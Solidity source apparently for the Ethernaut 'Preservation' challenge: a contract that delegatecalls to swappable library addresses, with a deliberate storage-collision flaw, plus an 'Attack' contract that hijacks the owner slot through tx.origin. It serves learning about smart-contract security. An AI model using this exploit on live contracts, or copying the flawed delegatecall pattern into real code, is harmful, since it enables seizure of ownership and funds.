pragma solidity >=0.7.0 <0.9.0;

contract Preservation {

    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint public storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address timeA, address timeB) public {
        //timeZone1Library = address of library1;
        //timeZone2Library = address of library2;
        timeZone1Library = timeA;
        timeZone2Library = timeB;
        owner = msg.sender;
    }

    //   // set the time for timezone 1
    //   function setFirstTime(uint _timeStamp, address addr) public {
    //     addr.delegatecall(abi.encodeWithSelector(setTimeSignature, _timeStamp));
    //   }

    //   // set the time for timezone 2
    //   function setSecondTime(uint _timeStamp, address addr) public {
    //     addr.delegatecall(abi.encodeWithSelector(setTimeSignature, _timeStamp));
    //   }

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        address(timeZone1Library).delegatecall(abi.encodeWithSelector(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        address(timeZone2Library).delegatecall(abi.encodeWithSelector(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {

    // stores a timestamp
    uint public storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

contract Attack {
    uint padding1;
    uint padding2;
    address public owner;

    function setTime(uint _time) public {
        owner = tx.origin;
    }
}